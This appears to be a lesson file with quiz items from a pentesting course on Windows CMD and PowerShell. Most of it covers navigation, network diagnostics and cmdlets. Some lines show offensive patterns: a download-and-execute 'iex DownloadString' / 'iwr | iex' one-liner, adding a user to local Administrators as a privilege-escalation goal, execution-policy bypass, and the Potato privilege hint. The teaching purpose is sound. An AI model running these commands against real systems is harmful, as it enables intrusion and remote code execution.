title: Windows Command Line: CMD and PowerShell
description: From classic cmd to PowerShell cmdlets: navigating, querying the system and automating in the language that governs domains.

1.title: CMD: the classic that's still alive
1.body:
## The commands you'll always use

```bat
dir                     :: list (like ls)
cd Usuarios             :: change directory
type archivo.txt        :: like cat
copy a.txt b.txt        :: copy
move b.txt ..\          :: move
del b.txt               :: delete
tasklist                :: processes (like ps)
taskkill /PID 1234 /F   :: kill a process
cls                     :: clear the screen
```

## Network diagnostics from cmd

```bat
ipconfig            :: my IPs
ipconfig /all       :: + DNS, MAC, DHCP
ping 10.10.10.5     :: connectivity
tracert 10.10.10.5  :: hops
netstat -ano        :: ports + PID of each connection
arp -a              :: known hosts on my local network
route print         :: routing table
```

`netstat -ano` is your Windows `ss -tulpn`. You cross-reference the PID it shows with
`tasklist | findstr <PID>` to find out which program is listening there.

## The net command (you already know it from AD)

```bat
net user                       :: local users
net user ana /add              :: create a user
net localgroup Administradores ana /add   :: add it to the admins group
net share                      :: shared resources
```

In a privilege escalation lab, that third line is usually the happy ending.

linea-de-comandos-windows-t01-q01.prompt: Which cmd command lists directory contents?

linea-de-comandos-windows-t01-q02.prompt: Which command shows the routing table and network connections (with -ano you see processes)?

linea-de-comandos-windows-t01-q03.prompt: In cmd, what does 'ipconfig /all' do compared to plain 'ipconfig'?
linea-de-comandos-windows-t01-q03.hint: The option name says it all.

options.b: It also shows DNS, MAC and the detailed configuration of each interface

2.title: PowerShell: cmdlets
2.body:
## Cmdlets: verb-noun

```powershell
Get-Process                # processes
Get-Service                # services
Get-ChildItem              # list (aliases: ls, dir — they work!)
Get-Content archivo.log    # cat
Get-Command *firewall*     # discover cmdlets
Get-Help Get-Process       # manual
```

The magic: the output is an **object** with properties. Filter and format it without grep:

```powershell
Get-Process | Where-Object CPU -gt 100 | Sort-Object CPU -Descending
Get-Service | Where-Object Status -eq 'Running' | Select-Object -First 10
Get-NetTCPConnection -State Listen
Get-LocalUser
```

Compare `Get-NetTCPConnection -State Listen` with cmd's `netstat -ano` + findstr:
same result, no parsing at all.

## System and execution

```powershell
Get-ComputerInfo           # Windows version, RAM, domain
whoami /priv               # my privileges (SeImpersonate? potato!)
Get-ExecutionPolicy        # can I run .ps1 scripts?
Set-ExecutionPolicy -Scope Process Bypass   # typical in labs
```

`whoami /priv` deserves a bookmark: the **SeImpersonatePrivilege** privilege on a
web service is the door to the classic Potato attack. You'll practice it with a lab in
Jr Pentester.

linea-de-comandos-windows-t02-q01.prompt: What are the native PowerShell commands that follow the Verb-Noun convention (Get-Process, Get-Service…) called?

linea-de-comandos-windows-t02-q03.prompt: What advantage does PowerShell have over cmd when handling output?

options.b: The output is OBJECTS with properties you can filter and sort without parsing text
options.c: It allows more colors in the terminal

3.title: Pipelines, variables and your first PS script
3.body:
## The object pipeline

```powershell
Get-ChildItem -Recurse -Filter *.log |
  Where-Object Length -gt 1MB |
  Sort-Object Length -Descending |
  Select-Object Name, Length, FullName |
  Export-Csv grandes.csv -NoTypeInformation
```

Each cmdlet passes complete objects to the next one. `$_` is the current object:

```powershell
Get-Service | Where-Object { $_.Status -eq 'Stopped' -and $_.Name -like '*sql*' }
```

## Your first script

```powershell
# enumerar.ps1 — first pass over a Windows machine
Write-Host "== Sistema ==";      Get-ComputerInfo | Select-Object WindowsProductName, OsVersion
Write-Host "== Usuarios ==";     Get-LocalUser
Write-Host "== Puertos ==";      Get-NetTCPConnection -State Listen | Select-Object LocalAddress, LocalPort, OwningProcess
Write-Host "== Privilegios ==";  whoami /priv
```

```powershell
powershell -ExecutionPolicy Bypass -File .\enumerar.ps1
```

That's exactly your Linux `enumerar.sh`, on Windows. Same methodology, different
language — you can now operate on both systems in the path. Final note: attackers use
`iex (New-Object Net.WebClient).DownloadString('http://.../script.ps1')` (or its
short form with `iwr ... | iex`) to load tools in memory; you'll see that
pattern in every offensive-tool walkthrough.

linea-de-comandos-windows-t03-q01.prompt: Which automatic PowerShell variable represents the current pipeline object?
linea-de-comandos-windows-t03-q01.hint: The dollar sign followed by an underscore.

linea-de-comandos-windows-t03-q02.prompt: Which cmdlet runs a string as code and is combined with DownloadString to launch scripts downloaded from a URL (never from sources you don't control)?
linea-de-comandos-windows-t03-q02.hint: Look at the task's final note: it goes right after the pipe in 'iwr ... | ___'.

options.b: It finds every .zip recursively and shows its full path
options.c: It deletes the zips after listing them
options.d: It opens the zips in File Explorer
